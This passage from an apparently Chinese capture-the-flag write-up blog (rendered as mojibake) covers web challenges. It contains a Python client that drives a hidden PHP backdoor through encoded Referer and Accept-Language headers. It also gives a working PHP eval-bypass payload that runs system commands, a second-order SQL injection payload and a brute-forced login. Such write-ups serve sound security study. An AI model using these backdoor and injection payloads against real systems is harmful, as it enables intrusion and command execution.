å¹¶ä¸ºå…¶æ·»åŠ æƒé‡å€¼</span>acceptLangStr = <span class="hljs-string">&#x27;,&#x27;</span>.join(acceptLang)    <span class="hljs-comment"># å°†å¤šä¸ª Accept-Language ç”¨ &quot; , &quot; æ‹¼æ¥åœ¨ä¸€èµ·</span><span class="hljs-comment"># acceptLangStr å³ä¸ºè¦ä½¿ç”¨çš„ Accept-Language</span>debugPrint(acceptLangStr)init2Char = acceptLang[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + acceptLang[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]    <span class="hljs-comment"># $i</span>md5head = (md5(init2Char + keyh).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]    <span class="hljs-comment"># $h</span>md5tail = (md5(init2Char + keyf).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>] + randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">8</span>))    <span class="hljs-comment"># $f + å¡«å……å­—ç¬¦ä¸²</span>debugPrint(<span class="hljs-string">&#x27;$i is %s&#x27;</span> % (init2Char))debugPrint(<span class="hljs-string">&#x27;md5 head: %s&#x27;</span> % (md5head,))debugPrint(<span class="hljs-string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))<span class="hljs-comment"># äº¤äº’å¼ Shell</span>cmd = <span class="hljs-string">&quot;system(&#x27;&quot;</span> + raw_input(<span class="hljs-string">&#x27;shell &gt; &#x27;</span>) + <span class="hljs-string">&quot;&#x27;);&quot;</span><span class="hljs-keyword">while</span> cmd != <span class="hljs-string">&#x27;&#x27;</span>:    <span class="hljs-comment"># åœ¨å†™å…¥ Payload å‰å¡«å……ä¸€äº›æ— å…³æ•°æ®</span>    query = []    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">max</span>(indexes)+<span class="hljs-number">1</span>+randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)):        key = randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>))        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="hljs-number">3</span>,<span class="hljs-number">12</span>)))        query.append((key, value))    <span class="hljs-comment"># ç”Ÿæˆæ— å…³æ•°æ®å¹¶å¡«å……</span>    debugPrint(<span class="hljs-string">&#x27;Before insert payload:&#x27;</span>)    debugPrint(query)    debugPrint(urllib.urlencode(query))    <span class="hljs-comment"># å¯¹ Payload è¿›è¡ŒåŠ å¯†</span>    payload = zlib.compress(cmd)    <span class="hljs-comment"># gzcompress æ“ä½œ</span>    payload = loopXor(payload,xorKey)    <span class="hljs-comment"># å¾ªç¯å¼‚æˆ–è¿ç®— , PHPä»£ç ä¸­çš„ x() å‡½æ•°</span>    payload = base64.urlsafe_b64encode(payload)    <span class="hljs-comment"># base64_encode ç¼–ç </span>    payload = md5head + payload    <span class="hljs-comment">#    åœ¨å¼€å¤´è¡¥å…¨$h</span>    <span class="hljs-comment">#  å¯¹Payloadè¿›è¡Œä¿®æ”¹</span>    cutIndex = randint(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">3</span>)    payloadPieces = (payload[<span class="hljs-number">0</span>:cutIndex], payload[cutIndex:], md5tail)    iPiece = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> indexes:        query[i] = (query[i][<span class="hljs-number">0</span>],payloadPieces[iPiece])        iPiece += <span class="hljs-number">1</span>    <span class="hljs-comment"># å°† Payload ä½œä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²ç¼–ç æ‹¼æ¥åˆ° Referer ä¸­</span>    referer = url + <span class="hljs-string">&#x27;?&#x27;</span> + urllib.urlencode(query)    debugPrint(<span class="hljs-string">&#x27;After insert payload, referer is:&#x27;</span>)    debugPrint(query)    debugPrint(referer)    <span class="hljs-comment"># å‘é€ HTTP GET è¯·æ±‚</span>    r = sess.get(url,headers=&#123;<span class="hljs-string">&#x27;Accept-Language&#x27;</span>:acceptLangStr,<span class="hljs-string">&#x27;Referer&#x27;</span>:referer&#125;,proxies=proxies)    html = r.text    debugPrint(html)    <span class="hljs-comment"># æ¥æ”¶å“åº”æ•°æ®åŒ…</span>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey,xorKey))    output = pattern.findall(html)    <span class="hljs-comment"># å¦‚æœæ²¡æœ‰æ”¶åˆ°å“åº”æ•°æ®åŒ…</span>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) == <span class="hljs-number">0</span>:        <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;Error,  no backdoor response&#x27;</span>)        cmd = <span class="hljs-string">&quot;system(&#x27;&quot;</span> + raw_input(<span class="hljs-string">&#x27;shell &gt; &#x27;</span>) + <span class="hljs-string">&quot;&#x27;);&quot;</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-comment"># å¦‚æœæ”¶åˆ°å“åº”æ•°æ®åŒ… , åˆ™å¯¹å…¶è¿›è¡Œå¤„ç†</span>    output = output[<span class="hljs-number">0</span>]    debugPrint(output)    output = output.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)    <span class="hljs-comment"># base64_decode è§£ç </span>    output = loopXor(output,xorKey)    <span class="hljs-comment"># å¾ªç¯å¼‚æˆ–è¿ç®—</span>    output = zlib.decompress(output)   <span class="hljs-comment"># gzuncompress è¿ç®—</span>    print(output)    <span class="hljs-comment"># è¾“å‡ºå“åº”ä¿¡æ¯</span>    cmd = <span class="hljs-string">&quot;system(&#x27;&quot;</span> + raw_input(<span class="hljs-string">&#x27;shell &gt; &#x27;</span>) + <span class="hljs-string">&quot;&#x27;);&quot;</span></code></pre><p>éš¾åº¦å±å®æœ‰ç‚¹å¤§äº†ï¼Œè¶…å‡ºèƒ½åŠ›èŒƒå›´ã€‚</p><p>å‚è€ƒ</p><blockquote><p><a href="https://www.guildhab.top/?p=1474">Web_php_wrong_nginx_config WriteUp â€“ H0t-A1r-B4llo0n (guildhab.top)</a></p><p><a href="https://blog.csdn.net/weixin_44604541/article/details/107801811">(2æ¡æ¶ˆæ¯) æ”»é˜²ä¸–ç•Œ webé«˜æ‰‹è¿›é˜¶åŒº 7åˆ†é¢˜ Web_php_wrong_nginx_config_é—µè¡Œå°é±¼å¡˜-CSDNåšå®¢</a></p></blockquote><h2 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h2><p>è¿™å‡ºé¢˜äººå¤§æ„äº†å•Šã€‚ã€‚ã€‚ç›´æ¥å¯ä»¥ç»™æ˜¾ç¤ºå‡ºæ¥äº†</p><p><img src="https://i.loli.net/2020/12/05/bPZfgzaGHwDoinr.png" alt="image-20201205201112120"></p><p>è¿˜æ˜¯æ­£å¸¸åšä¸€åšï¼Œè¿™é¢˜å¥½åƒæœ‰é—®é¢˜ï¼Œå°±åœ¨buuctfä¸Šåšäº†</p><h3 id="0x1ä»£ç å®¡è®¡-1"><a href="#0x1ä»£ç å®¡è®¡-1" class="headerlink" title="0x1ä»£ç å®¡è®¡"></a>0x1ä»£ç å®¡è®¡</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;    show_source(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-comment">//ä¾‹å­ c=20-1</span>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);    &#125;    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);        &#125;    &#125;    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);      <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);        &#125;    &#125;    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);&#125;</code></pre><p>getæäº¤å‚æ•°cï¼Œcçš„é•¿åº¦ä¸èƒ½è¶…è¿‡80</p><p>ä¸èƒ½åŒ…æ‹¬blacklistä¸­çš„å­—ç¬¦</p><p>ä¸èƒ½æœ‰ä¸æ˜¯$whitelistç™½åå•é‡Œé¢çš„å•è¯å‡ºç°</p><p>å¹¶ä¸”å‡½æ•°åªèƒ½ä»¥ä¸‹é¢çš„æ ¼å¼å‡ºç°</p><blockquote><p>abs(1)èƒ½è¿‡<br>1abs()èƒ½è¿‡<br>absa()ä¸èƒ½è¿‡<br>abs(a)ä¸èƒ½è¿‡<br>abs()aä¸èƒ½è¿‡</p></blockquote><p>ä»£ç çš„æœ€åå‡ºç°äº† eval è¿™æ˜¯æˆ‘ä»¬æƒ³çœ‹åˆ°çš„ï¼Œå› ä¸ºå®ƒå‡ºç°çš„æ—¶å€™ï¼Œå°±å¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>è¿™é¢˜å®åœ¨æ˜¯æ— èƒ½ä¸ºåŠ›ï¼Œçœ‹äº†ç‹å¸ˆå‚…çš„wp</p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">è¯¦æƒ…çœ‹è¿™é‡Œ</a></p><h3 id="0x2æ„é€ payload-1"><a href="#0x2æ„é€ payload-1" class="headerlink" title="0x2æ„é€ payload"></a>0x2æ„é€ payload</h3><p>//è¿™é¢˜éœ€è¦ä½¿ç”¨åˆ°phpå¤æ‚å˜é‡ï¼Œå…·ä½“å¯ä»¥çœ‹<a href="https://xz.aliyun.com/t/4785">è¿™é‡Œ</a></p><p>å½“è¿™ä¸ªé¢˜ç›®æ²¡æœ‰ç»™å‡ºé‚£ä¹ˆé™åˆ¶çš„æ—¶å€™æˆ‘ä»¬æƒ³è¦æ„é€ çš„payloadä¸€å®šæ˜¯</p><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>)</code></pre><p>ä½†æ˜¯ç”±äºé™åˆ¶ï¼Œå¿…é¡»æƒ³åŠæ³•ç»•è¿‡è¿™äº›é™åˆ¶ï¼Œæ¯”å¦‚å¤šæäº¤ä¸€ä¸ªå‚æ•°ï¼Œæ„é€ å‡ºä¸Šé¢çš„payload</p><p>æ¯”å¦‚</p><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[b])(<span class="hljs-symbol">$</span>_GET[a])&amp;b=<span class="hljs-keyword">system</span>&amp;a=cat /flag <span class="hljs-comment">//è¿™é‡Œæ˜¯b,aå¤šæäº¤çš„å‚æ•°ï¼Œä¸ä¼šè¢«æ£€æµ‹ è¿™é‡Œçš„[]å¯ä»¥ä½¿ç”¨&#123;&#125;ä»£æ›¿</span></code></pre><p>ä¸‹é¢çš„å…·ä½“å·¥ä½œå°±æ˜¯å¦‚ä½•åˆ©ç”¨ä¸Šé¢æä¾›çš„å‡½æ•°æ„é€ å‡º <code>_GET</code>ï¼Œå¹¶ä¸”èƒ½å¤Ÿç»•è¿‡æ£€æµ‹ã€‚</p><p>é¦–å…ˆçœ‹ä¸€ä¸‹å‡½æ•°çš„ç™½åå•é‡Œç»™äº†å“ªäº›å¯ä»¥ç”¨çš„å‡½æ•°<strong>base_convert()ï¼Œdechex</strong></p><p>è¿˜æœ‰ä¸€äº›çŸ­çš„å‡½æ•°åpi,cos,sin,tanç­‰ï¼Œå› ä¸ºé™åˆ¶äº†é•¿åº¦ï¼Œæ‰€ä»¥è¦å°½é‡ä½¿ç”¨çŸ­çš„å‡½æ•°åä»£æ›¿aå’Œb</p><p><img src="https://i.loli.net/2020/12/05/GnP1emRYpJDd2Q6.png" alt="base_convert"></p><p><img src="https://i.loli.net/2020/12/05/TsrCzK3hAl4ufEm.png" alt="dechex"></p><p>å¼€å§‹çš„æƒ³æ³•å°±æ˜¯å°†åˆ©ç”¨base_canvert()ï¼Œè½¬åŒ–å‡ºä¸€ä¸ª_GETï¼Œä½†æ˜¯å‘ç°base_convert()ä¸æ”¯æŒ_ï¼Œå¹¶ä¸”è½¬æ¢å‡ºçš„å­—ç¬¦æ˜¯å°å†™çš„</p><p><img src="https://i.loli.net/2020/12/05/9G4zKrO2HMoc1vN.png" alt="image-20201205215546962"></p><p>æ‰€ä»¥è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªä¸­é—´è¿‡æ¸¡çš„å‡½æ•°hex2bin()ï¼Œä¸ä¹‹åŠŸèƒ½æƒ³åçš„å‡½æ•°æ˜¯bin2hex()</p><p><img src="https://i.loli.net/2020/12/05/JeivVF1qO8YyRmK.png" alt="image-20201205220057762"></p><p>å®ç°æ–¹æ³•å¦‚ä¸‹</p><p><img src="https://i.loli.net/2020/12/05/FVMbzCNOwkIsnWd.png" alt="image-20201205215938937"></p><p>ä¸‹é¢å°±æ˜¯å°†_GETè½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°å­—</p><pre><code class="hljs gams"><span class="hljs-comment">//bin2hex(&quot;_GET&quot;)-&gt;5f474554</span>?c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-number">5</span>f474554);(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-number">1</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-number">2</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-number">2</span>=tac /flag</code></pre><p>æƒ³æ³•æ˜¯å¥½çš„ï¼Œä½†æ˜¯è¿™é‡Œä¸èƒ½ç›´æ¥æäº¤ï¼Œå› ä¸ºä¸ç¬¦åˆä¸Šé¢çš„å‡ ç§å‡½æ•°ä½¿ç”¨çš„æ ¼å¼</p><p>æ‰€ä»¥å°±è¦æƒ³åŠæ³•ä½¿ç”¨ä¸€ä¸ªå‡½æ•°æŠŠ<code>5f474554</code>æäº¤ä¸Šå»</p><p>è¿™é‡Œç”¨çš„æ˜¯dechexï¼Œå°±æ˜¯å°†åè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ï¼Œå†äº¤ç»™hex2binå‡ºæ¥</p><p>æ‰€ä»¥è¿™é‡Œæœ‰ä¸ªé€†è¿‡ç¨‹å°±æ˜¯å°†<code>5f474554</code>è½¬æ¢ä¸ºåè¿›åˆ¶</p><pre><code class="hljs apache"><span class="hljs-attribute">intval</span>(&#x27;<span class="hljs-number">5</span>f<span class="hljs-number">474554</span>&#x27;,<span class="hljs-number">16</span>);</code></pre><p>æ‰€ä»¥å…·ä½“çš„payloadå¦‚ä¸‹</p><pre><code class="hljs awk">?c=<span class="hljs-variable">$pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));($<span class="hljs-variable">$pi</span>)&#123;<span class="hljs-number">1</span>&#125;(($<span class="hljs-variable">$pi</span>)&#123;<span class="hljs-number">2</span>&#125;)&amp;<span class="hljs-number">1</span>=system&amp;<span class="hljs-number">2</span>=tac /flag<span class="hljs-regexp">//</span>base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)=&gt;hex2bin<span class="hljs-regexp">//</span>dechex(<span class="hljs-number">1598506324</span>)=&gt;<span class="hljs-number">5</span>f474554<span class="hljs-regexp">//</span>hex2bin(<span class="hljs-string">&#x27;5f474554&#x27;</span>)=&gt;_GET<span class="hljs-regexp">//</span><span class="hljs-variable">$pi</span>=_GET<span class="hljs-regexp">//</span>(<span class="hljs-variable">$_GET</span>)&#123;<span class="hljs-number">1</span>&#125;(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-number">2</span>&#125;)</code></pre><p>7åˆ†çš„é¢˜ç›®æœç„¶ä¸ä¸€æ ·ï¼Œçœ‹wpéƒ½å†™äº†å¥½ä¹…</p><p>æ—¢ç„¶æ²¡æœ‰èƒ½åŠ›è‡ªå·±åšå‡ºæ¥ï¼Œé‚£å°±å¥½å¥½ç ”ç©¶ä¸€ä¸‹åˆ«äººåšé¢˜çš„æ€è·¯ï¼Œä»¥ä¾¿ä»¥åé‡åˆ°ç±»ä¼¼é¢˜ç›®èƒ½å¤Ÿæœ‰æ€è·¯ã€‚</p><h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><h3 id="0x1æ‰«æç›®å½•"><a href="#0x1æ‰«æç›®å½•" class="headerlink" title="0x1æ‰«æç›®å½•"></a>0x1æ‰«æç›®å½•</h3><p>æ‹¿åˆ°é¢˜ç›®æ‰« ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°æ˜¯å‡ºç°.gitï¼Œé‚£åº”è¯¥å°±æ˜¯gitæºç æ³„éœ²ï¼Œå¯æ˜¯githackerä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶å¥½åƒä¸å…¨ï¼Œçœ‹äº†çœ‹å¤§ä½¬çš„wp</p><p>æš‚æ—¶æ²¡ææ‡‚æ˜¯æ€ä¹ˆä¸‹è½½çš„ï¼Œæ—¥åå†çœ‹ç»†çœ‹</p><p>æºç å¦‚ä¸‹</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;session_start();<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])&#123;<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:    <span class="hljs-variable">$category</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);    <span class="hljs-variable">$title</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);    <span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:    <span class="hljs-variable">$bo_id</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);    <span class="hljs-variable">$num</span> = mysql_num_rows(<span class="hljs-variable">$result</span>);    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;    <span class="hljs-variable">$category</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);    &#125;    header(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);    <span class="hljs-keyword">break</span>;<span class="hljs-keyword">default</span>:    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>å¯ä»¥çœ‹åˆ°åœ¨writeéƒ¨åˆ†æäº¤çš„éƒ½æ˜¯ç»è¿‡è½¬ä¹‰åå¸¦å…¥æŸ¥è¯¢è¯­å¥æŸ¥è¯¢çš„ï¼Œä½†æ˜¯ä¸‹é¢çš„commentä¸­categoryæ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤å°±å¸¦å…¥äº†sqlè¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼Œè¿™å°±å¯èƒ½å­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><h3 id="0x2äºŒæ¬¡æ³¨å…¥"><a href="#0x2äºŒæ¬¡æ³¨å…¥" class="headerlink" title="0x2äºŒæ¬¡æ³¨å…¥"></a>0x2äºŒæ¬¡æ³¨å…¥</h3><p>è¿›å…¥é¢˜ç›®å¯ä»¥æäº¤è¯„è®ºï¼Œä½†æ˜¯è¦ç™»å½•ï¼Œç»™äº†æç¤º</p><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>zhangwei<span class="hljs-symbol">password:</span>zhangwei***</code></pre><p>ä½¿ç”¨bpçˆ†ç ´å‡ºçš„å¯†ç æ˜¯zhangwei666</p><p><img src="https://i.loli.net/2020/12/07/8Xx35WQfTARLcnz.png" alt="image-20201207093624672"></p><p>ç™»å½•åå…ˆè¿›å…¥å‘å¸–çš„ç•Œé¢,æ„é€ payload</p><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;$category&#39;,                content &#x3D; &#39;$content&#39;,                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p>ä¹‹å‰sqlæ³¨å…¥æ–¹æ³•ä¸­ç»å¸¸ä½¿ç”¨çš„æ³¨é‡Šæ–¹æ³•éƒ½æ˜¯å½“è¡Œæ³¨é‡Šï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®çš„æŸ¥è¯¢ä½¿ç”¨çš„æ˜¯å¤šè¡Œï¼Œæ‰€ä»¥è¿™é‡Œæ³¨é‡Šä¹Ÿéœ€è¦ä½¿ç”¨å¤šè¡Œæ³¨é‡Š  /**/ </p><p>åœ¨è¿™é‡Œæ³¨å…¥çš„sqlè¯­å¥ï¼Œåœ¨commenté¡µé¢ä¼šè¢«sqlé‡æ–°è°ƒå‡ºæ¥ï¼Œä»è€Œæ‰§è¡Œäº†æ³¨å…¥è¯­å¥ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºå•¥å«åšäºŒæ¬¡æ³¨å…¥</p><p>äºæ˜¯æ„é€ çš„sqlè¯­å¥å¦‚ä¸‹</p><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;&#39;,content&#x3D;user(),&#x2F;*&#39;,                content &#x3D; &#39;*&#x2F;#&#39;,                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p>å› ä¸ºä¸­é—´çš„ cntentè¢«åŒ…å›´åœ¨å¤šè¡Œæ³¨é‡Šä¸­é—´ï¼Œæ‰€ä»¥è¿™é‡Œä¸èµ·ä½œç”¨ç­‰ä»·äº</p><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;&#39;,content&#x3D;user(),                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p>å½“åœ¨è¯„è®ºé¡µé¢è¯„è®º<code>*/#</code>æ—¶ï¼Œä¼šä¸ä¹‹å‰çš„<code>/*</code>çš„è¿›è¡Œé—­åˆï¼Œå°±å¤Ÿé€ 